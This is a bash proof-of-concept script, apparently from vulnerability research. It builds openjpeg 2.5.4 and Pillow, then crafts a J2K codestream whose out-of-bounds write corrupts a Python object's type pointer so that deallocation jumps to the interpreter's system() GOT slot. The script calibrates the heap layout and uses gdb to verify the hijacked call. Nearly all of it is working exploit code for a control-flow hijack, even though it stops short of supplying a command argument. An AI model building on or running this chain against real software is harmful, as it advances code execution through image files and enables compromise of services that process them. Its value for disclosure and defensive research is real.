#!/usr/bin/env bash
# Codestream-chosen call target through the system GOT slot, observed in a
# real Pillow/libopenjp2 2.5.4 process under OS ASLR.
#
# The OOB store writes a codestream position into a live object's ob_type.
# Choosing GOT(system) - 0x30 makes _Py_Dealloc's natural
# "mov 0x8(%rdi),%rax; jmp *0x30(%rax)" land on the system GOT slot's value.
# gdb only observes; it never writes memory and never continues into the call.
# No command, shell, listener, external probe or chosen argument is claimed.
#
# Usage: bash got-target.sh OUTDIR
set -u

HERE=$(cd "$(dirname "$0")" && pwd)
OUT=$(mkdir -p "$1" && cd "$1" && pwd)

VLSRC="$OUT/src/openjpeg-2.5.4"
mkdir -p "$OUT/src"
tar -xzf "$HERE/src/openjpeg-2.5.4.tar.gz" -C "$OUT/src"
cmake -S "$VLSRC" -B "$OUT/dbg-build" -DBUILD_SHARED_LIBS=ON -DBUILD_CODEC=OFF \
  -DBUILD_TESTING=OFF -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="-g -O0 -fno-omit-frame-pointer" \
  -DCMAKE_INSTALL_PREFIX="$OUT/dbg-install" > "$OUT/cmake.log" 2>&1
cmake --build "$OUT/dbg-build" -j4 > "$OUT/build.log" 2>&1
cmake --install "$OUT/dbg-build" > "$OUT/install.log" 2>&1
[ -f "$OUT/dbg-install/lib/libopenjp2.so.7" ] || { echo "FAIL debug lib build"; exit 1; }

PILROOT="$OUT/pc/pw-vuln"
if [ ! -d "$PILROOT/PIL" ]; then
  bash "$HERE/pillow-consumer.sh" "$OUT/pc" > /dev/null 2>&1
  [ -d "$PILROOT/PIL" ] || { echo "FAIL pillow build"; exit 1; }
fi

n=0
pass() { n=$((n+1)); echo "PASS $n $1"; }
fail() { echo "FAIL $1"; exit 1; }

PY=$(readlink -f "$(command -v python3)")
GOT_HEX=$(objdump -R "$PY" | grep ' system@' | awk '{print $1}')
[ -n "$GOT_HEX" ] || fail "no system GOT slot in $PY"
GOT=$((16#$GOT_HEX))
FAKE=$((GOT - 0x30))
echo "TARGET python=$PY GOT(system)=0x$(printf %x $GOT) FAKE_TYPE=0x$(printf %x $FAKE)"
pass "derived GOT(system) and fake type base from the live interpreter"

# One measurement pass corrects the small, build-dependent difference between
# the generator's SOD formula and the realized l_current_pos at sink hit 154.
python3 "$HERE/make-got-target.py" "$HERE/src/poc.j2k" "$OUT/base.j2k" \
  "$FAKE" 158 420 3872 > "$OUT/gen1.log" 2>&1 || fail "initial generate"
cp "$OUT/base.j2k" "$OUT/measure.j2k"
LD_LIBRARY_PATH="$OUT/dbg-install/lib" PILROOT="$PILROOT" \
  gdb -q -batch -x "$HERE/got-measure.gdb" --args \
  python3 "$HERE/pillow-probe.py" "$OUT/measure.j2k" > "$OUT/measure.log" 2>&1
W1_HEX=$(sed -n 's/^MEASURED_W1=//p' "$OUT/measure.log" | tr -d '\n')
[ -n "$W1_HEX" ] || fail "no measured W1"
WANT=$((FAKE + FAKE - 16#$W1_HEX))
python3 "$HERE/make-got-target.py" "$HERE/src/poc.j2k" "$OUT/base.j2k" \
  "$WANT" 158 420 3872 > "$OUT/gen2.log" 2>&1 || fail "corrected generate"
echo "CALIBRATION want=0x$(printf %x $WANT) measured=0x$W1_HEX target=0x$(printf %x $FAKE)"
pass "corrected write value to the measured GOT-derived target"

# Codestream bytes and write values are fixed; only the argv filename length
# varies until a live gap object sits at tp_index base + 24*154.
J2K=""
for L in 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24; do
  NAME=$(python3 -c "print('c'*($L-5)+'.j2k')")
  cp "$OUT/base.j2k" "$OUT/$NAME"
  LD_LIBRARY_PATH="$OUT/dbg-install/lib" PILROOT="$PILROOT" \
    gdb -q -batch -x "$HERE/gap-scan.gdb" --args \
    python3 "$HERE/pillow-probe.py" "$OUT/$NAME" > "$OUT/scan.log" 2>&1
  if grep -q '^OBJ off=3696 mod24=0 refcnt=1 ' "$OUT/scan.log"; then
    J2K="$OUT/$NAME"
    break
  fi
  rm -f "$OUT/$NAME"
done
[ -n "$J2K" ] || fail "no argv layout with a gap object at base+24*154"
echo "CALIBRATED codestream=$(basename "$J2K")"
pass "live small-refcnt object aligned at the OOB destination"
: > "$OUT/trace.txt"
LD_LIBRARY_PATH="$OUT/dbg-install/lib" PILROOT="$PILROOT" \
  gdb -q -batch -ex "set \$got=$GOT" -x "$HERE/got-target.gdb" --args \
  python3 "$HERE/pillow-probe.py" "$J2K" > "$OUT/gdb.log" 2>&1
grep -E '^(PRE|WRITE|GOT_SLOT|POST|DEALLOC|ARG_FIRST_QWORD|CHOSEN_CALL)[ =]' \
  "$OUT/gdb.log" > "$OUT/trace.txt"

FAKE_HEX=$(printf '%016x' "$FAKE")
GOT_HEX16=$(printf '%016x' "$GOT")
grep -q "WRITE W1=$FAKE_HEX " "$OUT/trace.txt" || fail "W1 is not GOT(system)-0x30"
pass "OOB store writes GOT(system)-0x30 into ob_type"

grep -q "POST REF=1 TYPE=$FAKE_HEX" "$OUT/trace.txt" || fail "fake type did not persist"
pass "fake ob_type persists with ob_refcnt preserved"

grep -q "GOT_SLOT=$GOT_HEX16 GOT_VALUE=" "$OUT/trace.txt" || fail "GOT slot not observed"
pass "system GOT slot observed in the live process"

OBJ=$(sed -n 's/^PRE OBJ=\(0x[0-9a-f]*\) .*/\1/p' "$OUT/trace.txt")
grep -q "DEALLOC .* rdi=${OBJ} TYPE=$FAKE_HEX" "$OUT/trace.txt" || fail "no natural _Py_Dealloc"
pass "corrupted object reaches natural _Py_Dealloc"

CALL=$(sed -n 's/^CHOSEN_CALL pc=\(0x[0-9a-f]*\)$/\1/p' "$OUT/trace.txt")
GOTVAL=$(sed -n 's/^GOT_SLOT=[0-9a-f]* GOT_VALUE=\([0-9a-f]*\)$/\1/p' "$OUT/trace.txt")
CALL_HEX=${CALL#0x}
[ -n "$CALL_HEX" ] && [ "$((16#$CALL_HEX))" -eq "$((16#$GOTVAL))" ] || fail "call did not land on the system GOT value"
objdump -R "$PY" | grep -q ' system@' || fail "GOT symbol lost"
pass "indirect call lands on the system GOT value ($CALL)"

ARG=$(sed -n 's/^ARG_FIRST_QWORD=\([0-9a-f]*\)$/\1/p' "$OUT/trace.txt")
[ -n "$ARG" ] && [ "$((16#$ARG))" -lt 4096 ] || fail "unexpected call argument contents"
pass "call argument is not an attacker-chosen command string"

echo "RESULT $n PASS / 0 FAIL"
sha256sum "$OUT/trace.txt"
